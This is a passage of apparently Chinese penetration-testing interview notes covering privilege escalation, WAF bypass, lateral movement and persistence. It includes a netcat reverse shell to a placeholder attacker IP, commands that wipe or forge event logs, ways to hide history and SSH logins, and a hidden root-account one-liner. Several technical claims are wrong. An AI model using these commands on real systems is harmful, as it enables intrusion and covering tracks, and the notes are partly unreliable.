class="line">iis6.0目录解析：/test.asp/test.jpg</span><br><span class="line">iis6.0文件解析：test.asp;.jpg</span><br><span class="line">IIS7.5文件解析：test.jpg/.php</span><br></pre></td></tr></table></figure><p>(2) Apache 解析漏洞：<br>用户配置不当，如1.php.biubiu会被当成php文件执行</p><p>(3) Nginx 解析漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户配置不当，对于任意文件名，在后面加上/任意文件名.php后该文件就会以php格式进行解析，如1.png/.php</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/192063.html">Web中间件常见漏洞总结</a><br><a href="http://47.103.121.189/2022/06/02/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">常见中间件漏洞总结</a></p><ol start="2"><li>目前已知哪些版本的容器有解析漏洞，具体举例。</li></ol><p>见问题1</p><ol start="3"><li>常见的中间件</li></ol><p>IIS, Nginx, Apache, Tomcat, jBoss, WebLogic, shiro, struts, FastCGI</p><ol start="4"><li>中间件有哪些已知漏洞</li></ol><p>解析漏洞，远程代码执行，反序列化，目录遍历，PUT漏洞，文件上传，SSRF，目录穿越</p><h1 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1><ol><li>@ 请写出MySQL5数据库中查询库’helloworld’中’user’表所有列名的语句。</li></ol><p><code>select * from information_schema.COLUMNS where table_name = &#39;user&#39; and table_schema = &#39;helloworld&#39;;</code></p><ol start="2"><li>@ udf提权</li></ol><p>UDF(User Define Function)用户自定义函数，是MySQL的一个扩展接口，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user(), version()等函数。<br>udf文件后缀在Windows与Linux系统下分别为dll与so，即动态链接库文件，由C, C++编写</p><p>攻击原理：<br>(1) 攻击者在目标系统导入UDF。<br>(2) 攻击者通过SQL语句调用执行UDF。<br>(3) UDF利用漏洞执行任意命令，提升权限。</p><p>修复建议：<br>(1) MySQL配置文件中secure_file_priv预设置为NULL或非 <code>mysql/lib/plugin</code> 目录。<br>(2) 数据库用户确保正确实施最小权限原则。</p><p><a href="https://www.freebuf.com/articles/database/291175.html">Mysql-UDF提权篇</a></p><ol start="3"><li>为何一个mysql数据库的站，只有一个80端口开放？</li></ol><p>更改了端口，没有扫描出来。</p><ol start="4"><li>3389无法连接的几种情况</li></ol><p>没开放3389端口<br>端口被修改<br>防护拦截<br>处于内网(需要进行端口转发)</p><ol start="5"><li>@ MySQL两种提权方式</li></ol><p>(1) UDF提权：见问题2</p><p>(2) MOF提权：<br>MOF提权是指利用MOF文件的漏洞，将用户权限提升到与Windows系统的最高权限（System）一致。</p><p>原理：mof(Managed Object Format)是Windows系统的一个“托管对象格式”文件(位置 <code>c:/windows/system32/wbem/mof</code> )，其作用是每隔5秒就会去监控进程创建和死亡，mof目录下有两个文件夹(good与bad)。Windows server 2003及以下系统每5秒会执行一次mof目录下的文件，执行成功会移动到good文件夹，执行失败移动到bad文件夹。<br>mof提权其实就是利用mysql写入mof文件，通过mof文件中的vbs脚本与system权限执行系统命令。</p><p>修复：<br>解决系统继续运行恶意代码的问题：<br>net stop winmgmt<br>删除文件夹内容 <code>c:/windows/system32/wbem/repository</code><br>net start winmgmt</p><ol start="6"><li>Mongodb, redis, websphere, rsync服务简介和默认运行端口</li></ol><p>Mongodb: MongoDB是一个NoSQL数据库，它使用JSON格式存储数据，具有灵活的架构和可扩展性。面向文档的数据库管理系统，适用于处理大量数据和高并发请求。<br>默认端口：27017</p><p>Redis: Redis是一个内存数据库，它使用键值对存储数据，具有高性能和可靠性。可以用于缓存、消息队列、计数器等应用。<br>默认端口：6379</p><p>WebSphere: WebSphere是一个Java应用程序服务器，它用于部署和运行Java应用程序。支持Web服务、企业级应用等。<br>默认端口：9080</p><p>Rsync: Rsync是一个文件传输工具，它用于快速、安全地复制文件。远程文件同步工具，支持差异化同步和数据压缩。<br>默认端口：873</p><ol start="7"><li>MySQL中like查询会非常缓慢，如何进行优化？</li></ol><p>(1) 使用前缀索引。例如，如果表中有一个字段name，可以创建一个前缀索引name(10)。<br>(2) 使用正则表达式。例如，查询 <code>name like &#39;%张%&#39;</code> 可以使用 <code>name regexp &#39;^.*张.*$&#39;</code> 来代替。<br>(3) 使用全文搜索。全文搜索使得MySQL可以在整个文本内容中查找匹配项。这样可以快速找到诸如同义词和名词变体等匹配项。</p><ol start="8"><li>Oracle, mysql, sqlserver默认端口</li></ol><p>Oracle: 1521<br>MySQL: 3306<br>SQL Server: 1433</p><ol start="9"><li>@ 怎么通过数据库获取shell</li></ol><p>(1) MySQL Outfile导出webshell<br>(2) MySQL日志获取webshell<br>(3) mof提权<br>(4) udf提权</p><ol start="10"><li>数据库的提权有接触过吗？</li></ol><p>见问题5</p><ol start="11"><li>@ mssql的提权你能说一下吗？</li></ol><p>(1) 存储过程写webshell<br>利用条件：拥有DBA权限，知道网站的绝对路径。<br>利用存储过程写入一句话，注意路径。</p><p>(2) 差异备份写webshell<br>利用条件：需要知道绝对路径，路径可写</p><p>(3) 日志备份写webshell<br>利用条件：</p><ul><li>拥有DBA权限</li><li>知道网站绝对路径，并且可写</li><li>站库不分离</li><li>数据库必须被备份过一次</li></ul><p>优势：</p><ul><li>重复性好，多次备份的成功率高</li><li>相对于差异备份而言，shell的体积较小</li></ul><p>(4) sp_addextendedproc<br>sp_addextendedproc 可以利用于恢复组件</p><p>(5) xp_cmdshell<br>xp_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。</p><p>利用条件</p><ul><li>拥有 DBA 权限, 在 2005 中 xp_cmdshell 的权限是 system，2008 中是 network。</li><li>依赖 xplog70.dll</li></ul><p>(6) sp_oacreate(Ole Automation Procedures)<br>利用条件</p><ul><li>拥有DBA权限</li><li>依赖 odsole70.dll</li></ul><p>(7) xp_rewrite<br>利用条件</p><ul><li>xpstar.dll</li></ul><p>修改注册表来劫持粘贴键(映像劫持)</p><ol start="12"><li>怎么分辨数据库类型？</li></ol><p>前端与数据库类型：<br>asp: SQL Server, Access<br>.net: SQL Server<br>PHP: PostgreSQL, MySQL<br>Java: Oracle, MySQL</p><p>常用web和数据库构造：<br>ASP+Access 或 SQL Server<br>PHP+MySQL</p><p>各数据库标志性信息：<br>SQL Server: <code>select@@version --</code><br>Oracle: <code>select banner from v$version</code><br>MySQL: <code>select @@version, version() --</code>  <code>length(user)&gt;0</code><br>postgresql: <code>select version() --</code></p><p>各数据库特有的函数：<br>SQL Server: <code>@@pack_received  @@rowcount</code><br>MySQL: <code>connection_id()  last_insert_id() row_count()</code><br>oracle: <code>bitand(1,1)</code><br>postgresql: <code>select extract(dow from now())</code></p><p>对于字符串处理方式：<br>sql server ：<code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;ab&#39; --</code><br>mysql: <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;ab&#39; ， &#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code><br>oracle: <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39; ，&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code><br>postgresql : <code>id=1 and &#39;a&#39;+&#39;b&#39;=&#39;a&#39;||&#39;b&#39; ,&#39;ab&#39;=concat(&#39;a&#39;,&#39;b&#39;)</code></p><p>特殊符号，注释的判断<br>安顺序来<br>1,“null”和“%00”是Access支持的注释。<br>2，“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和 <code>/* */</code> 注释（注意mysql使用– 时需要后面添加空格）<br>3，“–”和 <code>/* */</code> 是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>4，“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。<br>这样一串下来，基本就知道了数据库类型了</p><p>对Mssql和access数据库的判断：<br><code>&#39; and exists (select count(*) from sysobjects) &gt;0</code> 正常，就是MSSQL数据库<br><code>&#39; and exists (select count(*) from msysobjects) &gt;0</code> 两条都不正常，是Access数据库</p><p>通过上面各种判断方法，各种主流数据库基本就能判断出来了。</p><ol start="13"><li>mysql数据库账号和密码存放在哪个库和表里面？</li></ol><p>mysql的user权限表里</p><ol start="14"><li>分别写出MySQL及mssql数据库写入webshell的方法</li></ol><p>MySQL: 见问题9<br>MYSSQL: 问题11</p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li>Windows、Linux、数据库的加固降权思路。</li></ol><p>禁用root，禁止远程访问，禁止写入，单独账号，禁止执行system等函数。</p><ol start="2"><li>谈一谈Windows系统与Linux系统提权的思路？</li></ol><p>Windows提权：<br>(1) 系统内核溢出漏洞提权<br>(2) 系统配置错误提权<br>(3) 组策略首选项提权<br>(4) bypassUAC提权<br>(5) 数据库提权(UDF，MOF)</p><p>Linux提权：<br>(1) 内核漏洞提权<br>(2) 定时任务提权<br>(3) SUID提权<br>(4) Sudo滥用提权<br>(5) NFS提权<br>(6) Docker提权</p><ol start="3"><li>反弹shell的常用命令？一般常反弹哪一种shell？为什么？</li></ol><p>netcat反弹shell：<br>攻击机开启监听命令： <code>netcat -lvp 2333</code><br>目标机主动连接攻击机： <code>netcat &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</code></p><p>bash反弹shell：<br><code>nc -lvvp 7777 -e /bin/bash</code><br>bash是交互式，否则像useradd无法交互。</p><ol start="4"><li>如果一台服务器被入侵后，如何做应急响应？</li></ol><p>(1) 准备相关的工具，查后门等工具<br>(2) 初步判断时间类型，事件升级<br>(3) 抑制范围，隔离使受害面不继续扩大<br>(4) 查找原因，封堵攻击源<br>(5) 业务恢复正常水平<br>(6) 总结，报告，修复，监控</p><p>应急响应的经验：<br><a href="https://www.freebuf.com/defense/375005.html">网络安全应急响应典型案例</a><br><a href="https://forum.butian.net/share/2225">应急响应</a></p><ol start="5"><li>@ webshell检测有哪些方法？webshell的检测方式</li></ol><p>(1) 基于webshell特征检测<br>(2) 基于流量特征的webshell检测<br>(3) 基于webshell系统行为特征的检测<br>(4) 基于web日志webshell行为特征的检测<br>(5) 动态检测(沙箱)<br>(6) 统计学</p><ol start="6"><li>metasploit打开反向监听的命令</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><ol start="7"><li>应急响应的步骤</li></ol><p>见问题4</p><ol start="8"><li>@ 怎么查找域控</li></ol><p>(1) 通过DNS查询</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dig -t SRV _gc._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _ldap._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kerberos._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kpasswd._tcp.lab.ropnop.com</span><br></pre></td></tr></table></figure><p>(2) 端口扫描<br>域服务器都会开启3389端口，所以可以通过扫描端口进行识别。<br>(3) 各种命令<br>dsquery<br>net group “Domain Controllers”<br>nltest &#x2F;DCLIST:pentest.com</p><ol start="9"><li>如何手工快速判断目标站是Windows还是Linux服务器？</li></ol><p>(1) Linux大小写敏感，Windows大小写不敏感<br>(2) ping服务器，返回的TTL值不同。Windows一般在100以上，Linux一般100以下。<br>TTL&#x3D;128: WINNT&#x2F;2K&#x2F;XP<br>TTL&#x3D;32: WIN95&#x2F;98&#x2F;ME<br>TTL&#x3D;256: UNIX<br>TTL&#x3D;64: LINUX</p><ol start="10"><li>提权时选择可读写目录，为何尽量不用带空格的目录？</li></ol><p>因为exp执行多半需要空格界定参数</p><ol start="11"><li>某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</li></ol><p>同数据库</p><ol start="12"><li>后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</li></ol><p>审查元素。将密码处的password属性改为text属性即可明文显示密码。</p><ol start="13"><li>目标站无防护，上传文件可正常访问，上传脚本格式访问则403，什么原因？</li></ol><p>可能原因：<br>web服务器配置将上传文件写死了不执行相应脚本，可尝试改后缀名绕过。</p><ol start="14"><li>审查元素得知网站所使用的防护软件，你觉得是怎样做到的？</li></ol><p>在敏感操作被拦截，通过界面信息无法具体判断是什么防护时，F12看HTML顶部，比如护卫神就可以在名称看到那内容。</p><ol start="15"><li>在win2003服务器中建立一个 .zhongzi文件夹用意何为？</li></ol><p>隐藏文件夹，为了不让管理员发现传上去的工具。</p><ol start="16"><li>如何拿一个网站的webshell？</li></ol><p>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等。</p><ol start="17"><li>为什么aspx木马权限比asp大？</li></ol><p>aspx使用的是.net技术。在IIS6.0到IIS7.5，.NET默认的账户是aspnet，隶属于Users，而此时的ASP基于IUSER账户，隶属于Guest组，对于组来说Users组的权限 &gt; Guest组，所以能执行或者读取的资源更多。<br>IIS7.5之后，两者权限相同。都是基于默认的应用程序池defaultapppool<br><a href="https://www.dongchuanmin.com/net/3812.html">ASPX的webshell权限为什么比ASP的大</a></p><ol start="18"><li>如何绕过waf？</li></ol><p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 <code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p><p><a href="https://www.freebuf.com/articles/web/229982.html">WAF机制及绕过方法总结：注入篇</a></p><ol start="19"><li>如何向服务器写入webshell？</li></ol><p>各种上传漏洞<br>mysql具有写入权限，用sql语句写入shell<br>http put方法</p><ol start="20"><li>ddos如何防护</li></ol><p>(1) SYN Cookie&#x2F;SYN proxy, safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个cookie，并统计每个IP地址的访问频率。如果在短时间内收到大量来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被抛弃。（适用于单主机的DDOS）<br>(2) 过滤不必要的服务和端口, 可以使用Inexpress、Express、Forwarding等工具来过滤不必要的服务和端口，即在路由器上过滤假IP。<br>(3) 异常流量的清洗过滤：通过DDOS硬件防火墙对异常流量的清洗过滤，通过数据包的规则过滤、数据流指纹检测过滤、及数据包内容定制过滤等顶尖技术能准确判断外来访问流量是否正常，进一步将异常流量禁止过滤。<br>(4) 分布式集群防御：这是目前网络安全界防御大规模DDOS攻击的最有效办法。分布式集群防御的特点是在每个节点服务器配置多个IP地址（负载均衡），并且每个节点能承受不低于10G的DDOS攻击，如一个节点受攻击无法提供服务，系统将会根据优先级设置自动切换另一个节点，并将攻击者的数据包全部返回发送点，使攻击源成为瘫痪状态，从更为深度的安全防护角度去影响企业的安全执行决策。<br>(5) 高防智能DNS解析：高智能DNS解析系统与DDOS防御系统的完美结合，为企业提供对抗新兴安全威胁的超级检测功能。它颠覆了传统一个域名对应一个镜像的做法，智能根据用户的上网路线将DNS解析请求解析到用户所属网络的服务器。同时智能DNS解析系统还有宕机检测功能，随时可将瘫痪的服务器IP智能更换成正常服务器IP，为企业的网络保持一个永不宕机的服务状态。<br>(6) CDN。缺点是一旦被人知道源服务器的IP，就可绕过。</p><ol start="21"><li>有没有抓过包，会不会写wireshark过滤规则？</li></ol><p>有。wireshark和burpsuite<br>会写。wireshark过滤规则：</p><p>过滤IP：<br>过滤源IP地址： <code>ip.src==1.1.1.1</code><br>过滤目的IP地址： <code>ip.dst==1.1.1.1</code></p><p>过滤端口：<br>过滤80端口： <code>tcp.port==80</code><br>过滤源端口： <code>tcp.srcport==80</code><br>过滤目的端口： <code>tcp.dstport==80</code></p><p>协议过滤：<br>直接输入协议名即可，如http协议：<br><code>http</code></p><p>http模式过滤：<br>过滤get&#x2F;post包：<br><code>http.request.method==&quot;GET/POST&quot;</code></p><ol start="22"><li>清理日志要清理哪些？</li></ol><p>Linux清理日志见问题2<br>Windows清理日志：<br>(1) 命令行一键清除Windows事件日志：<br><code>PowerShell -Command &quot;&amp; &#123;clear-Eventlog -Log Application,System,Security&#125;&quot;</code><br><code>Get-WinEvent -ListLog Application,Setup,Security -Force | %&#123;Wevtutil.exe cl $_.Logname&#125;</code></p><p>(2) wevtutil.exe<br>操作系统默认包含，支持系统：win7及以上。<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>wevtutil.exe gli Application</code></p><p>查看指定类别的日志内容：<br><code>wevtutil qe /f:text Application</code></p><p>删除该类日志所有内容（单条内容删除暂不支持）：<br><code>wevtutil cl Application</code></p><p>(3) NSA DanderSpiritz<br><a href="https://3gstudent.github.io/NSA-DanderSpiritz%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%9C%A8%E9%A9%AC%E7%94%9F%E6%88%90%E4%B8%8E%E6%B5%8B%E8%AF%95">DanderSpritz</a>是NSA的一款界面化的远控工具<br>常用命令如下：<br>统计日志列表，查询所有日志信息，包含时间，数目<br><code>eventlogquery -log Application</code></p><p>查看指定类别的日志内容<br><code>eventlogfilter -log Application -num 10</code></p><p>删除该类日志所有内容<br><code>eventlogclear -log Application</code></p><p>删除单条内容<br><code>eventlogedit -log Application -record 1</code></p><p>注：<br>record序号可通过eventlogfilter获得</p><p>(4) Windows日志伪造，使用eventcreate这个命令行工具来伪造日志或使用自定义的大量垃圾信息覆盖现有日志。<br><code>eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</code></p><ol start="23"><li>查看当前端口连接的命令有哪些？ <code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点<br><code>netstat -an</code></li></ol><p>windows:<br>PowerShell: <code>Get-NetTCPConnection -State Listen</code></p><p>On Linux &#x2F; macOS:<br><code>sudo lsof -i -P -n | grep LISTEN</code></p><ol start="24"><li>判断域控的几种方式</li></ol><p>(1) 查看系统信息：在Windows系统中，可以通过以下命令查看系统信息：<br><code>systeminfo</code><br>如果是域控，则会显示域名和域控制器的名称。<br>(2) 查看域成员：可以通过以下命令查看域成员：<br><code>net group /domain</code><br>如果系统是域控，则会显示域中所有成员的信息。<br>(3) 查看域控制器：可以通过以下命令查看域控制器：<br><code>nltest /dclist:域名</code><br>该命令将显示域中的所有域控制器。<br>(4) 查看DNS记录：可以通过以下命令查看DNS记录：<br><code>nslookup -type=SRV _ldap._tcp.域名</code><br>该命令将显示域控制器的SRV记录。<br>(5) 查看计算机的角色：在Windows Server中，可以通过Server Manager查看一个计算机的角色。如果计算机的角色是“Active Directory 域服务”，则它是域控制器。</p><ol start="25"><li><p>@ 工作组横向<br>(1) 通过at&amp;schtasks进行明文传递<br>说明：at&amp;schtasks 都是 windows 上创建计划任务的命令，只是针对的版本不同，at是win2008及以下；<br>(2) atexec进行明文与HASH传递<br>(3) SMB服务利用<br>(4) WMI服务利用<br>(5) PTH横向传递攻击<br>(6) PTK横向传递攻击<br>(7) RDP传递攻击<br><a href="https://www.wangan.com/p/11v71d8e5253fc5f#%E4%B8%80%E3%80%81%E9%80%9A%E8%BF%87at&schtasks%E8%BF%9B%E8%A1%8C%E6%98%8E%E6%96%87%E4%BC%A0%E9%80%92">内网横向移动常用方法及工具总结</a></p></li><li><p>@ 域内横向</p></li></ol><p>(1) LM Hash 和 NTLM Hash<br>(2) PTH&amp;PTT&amp;PTK<br>(3) DCSync<br>(4) Zerologon 域提权漏洞<br>(5) 从NTDS.dit获取域散列值<br><a href="https://www.shawroot.cc/2204.html">域内横向移动学习笔记</a><br><a href="https://github.com/SewellDinG/Pentest-Notes/blob/master/%E7%AC%AC5%E7%AB%A0.%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1.md">域内横向移动分析及防御</a></p><ol start="27"><li>@ 白银票据黄金票据</li></ol><p>白银票据是指伪造的服务票据（Service Ticket，ST），它可以授权攻击者访问指定服务器上的指定服务。白银票据的生成需要以下条件：<br>1.域名称<br>2.域的SID值<br>3.域中的Server服务器账户的NTLM-Hash<br>4.伪造的用户名，可以是任意用户名.<br>5.目标服务器上面的kerberos服务</p><p>白银票据的生成过程如下：<br>通过mimikatz生成银票。</p><p>白银票据的使用过程如下：<br>使用mimikatz执行命令导入Silver Ticket</p><p>黄金票据是指伪造的TGT票据，它可以授权攻击者访问域内所有服务。黄金票据的生成需要以下条件：<br>1、域名称<br>2、域的SID值<br>3、域的KRBTGT账户密码HASH<br>4、伪造用户名，可以是任意的</p><p>黄金票据的生成过程如下：<br>得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。</p><p>黄金票据的使用过程如下：<br>通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。</p><p>黄金票据防御<br>1、限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。<br>2、禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证。</p><p>关于黄金票据和白银票据的一些区别:<br>1、访问权限不同<br>Golden Ticket: 伪造TGT,可以获取任何Kerberos服务权限<br>Silver Ticket: 伪造TGS,只能访问指定的服务</p><p>2、加密方式不同<br>Golden Ticket 由Kerberos的Hash—&gt; krbtgt加密<br>Silver Ticket 由服务器端密码的Hash值—&gt; master key 加密</p><p>3、认证流程不同<br>Golden Ticket 的利用过程需要访问域控(KDC)<br>Silver Ticket 可以跳过 KDC 直接访问对应的服务器</p><p><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">浅析黄金票据与白银票据</a></p><ol start="28"><li>@ 判断是否在域内</li></ol><p>1、 查看当前网卡和IP信息<br>使用命令 <code>ipconfig /all</code><br>在Windows IP 配置(Windows IP Configuration)下的主DNS后缀(Primary DNS Suffix)处：<br>如果为空，说明不在域内；<br>如果显示域名，说明在域内。</p><p>2、 查看操作系统详细信息<br>使用命令 <code>systeminfo</code><br>在域(Domain)处，如果：<br>显示 工作组(WORKGROUP)，说明不在域内。<br>显示 域名，说明在域内。</p><p>3、 查看当前登录域及域用户<br>使用命令 <code>net config workstation</code><br>在工作站域(Workstation Domain):<br>显示WORKGROUP，说明不在域内。<br>显示域名，说明在域内。而且多一行“工作站域DNS名称”。</p><p>4、 查看域内时间<br>使用命令 <code>net time /domain</code><br>通过执行以上命令后，会出现三种情况：<br>(1) 当前是工作组环境。会显示“找不到域 WORKGROUP 的域控制器。”<br>(2) 存在域，当前用户不是域用户。会显示“发生系统错误5。 拒绝访问。”<br>(3) 存在域，当前用户是域用户。会显示“DC1.xx.xx 的当前时间是 YY&#x2F;MM&#x2F;DD HH:MM:SS  命令成功完成”</p><ol start="29"><li>@ hash传递原理</li></ol><p>hash传递原理(Pass-The-Hash):<br>哈希传递攻击是基于NTLM认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用NTLM认证的一种缺陷，利用用户的密码哈希值来进行NTLM认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。</p><ol start="30"><li>@ 权限维持</li></ol><p>Windows权限维持：<br>(1) 辅助功能镜像劫持。比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序<br>(2) 启动项或服务后门。<br>(3) 系统计划任务后门。<br>(4) DLL劫持<br>(5) Winlogon用户登录初始化<br>(6) Logon Scripts 后门<br>(7) 文件关联<br>(8) Bitsadmin<br>(9) 进程注入<br>(10) 屏幕保护程序<br>(11) WMI构造无文件后门<br>(12) 影子用户<br><a href="https://xz.aliyun.com/t/9718">Windows权限维持总结</a></p><p>Linux权限维持：<br>1、隐藏文件：创建隐藏文件的命令 <code>touch .test.txt</code> ，在文件名前加一个点即可创造隐藏文件。<br>2、隐藏文件时间戳：Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。<br>3、隐藏权限：在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用 <code>ls -l</code> 是查看不出来的，从而达到隐藏权限的目的。<br>4、隐藏历史操作命令：(1) 只针对自己的工作关闭历史记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关闭历史功能命令 [space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br><span class="line">重启历史功能命令 [space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure><p>(2) 从历史记录中删除指定命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除历史记录的命令 history | grep &quot;keyword&quot;</span><br><span class="line">输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</span><br><span class="line">history -d [num]</span><br><span class="line">只保留前150行的命令 sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure><p>5、隐藏远程SSH登录记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">身登录系统，不会被w、who、last等指令检测到。</span><br><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br><span class="line">不记录ssh公钥在本地.ssh目录中</span><br><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash -i</span><br></pre></td></tr></table></figure><p>6、端口复用<br>通过端口复用来达到隐藏端口的目的<br>(1) 通过SSLH在同一端口上共享SSH与HTTPS<br>(2) 利用IPTables进行端口复用</p><p>7、进程隐藏<br>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。<br>(1) libprocesshider<br>(2) 进程注入工具linux-inject</p><p>8、一句话添加用户和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure><p>9、SUID Shell<br>Suid shell是一种可用于以拥有者权限运行的shell。</p><p>10、SSH公私钥免密登录<br>在客户端上生成一对公私钥，然后把公钥放到服务器上（ <code>~/.ssh/authorized_keys</code> ），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p><p>11、软连接<br>在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0即root权限即可成功认证登陆。</p><p>12、SSH Wrapper<br>从sshd 